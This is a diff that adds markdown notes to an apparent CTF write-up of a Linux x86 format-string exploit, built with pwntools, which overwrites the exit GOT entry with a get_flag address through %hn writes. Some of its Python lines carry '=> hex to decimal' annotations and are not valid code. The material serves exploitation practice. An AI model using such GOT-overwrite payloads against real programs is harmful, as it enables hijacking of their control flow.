@@ -1,3 +1,26 @@
+# &#35; linux x86
+#### format string
+
+```python
+## Source Point
+exit_got = 0x0804a024
+get_flag = 0x08048609
+
+# "\x26\xa0\x04\x08"+"\x24\xa0\x04\x08"+"%2044x"+"%1$hn"+"%32261x"+"%2$hn"
+
+payload  = b""
+payload += p32(exit_got)
+payload += p32(exit_got+2)
+payload += b"%2044x"            => hex to decimal !!!
+payload += b"%2$hn"
+payload += b"%32261x"           => hex to decimal !!!
+payload += b"%1$hn"
+
+```
+
+
+```python
+## Source code
 from pwn import *
 
 context.arch='i386'
@@ -31,3 +54,5 @@ with open("payload", "wb") as fd:
 
 
 conn.interactive()
+
+```
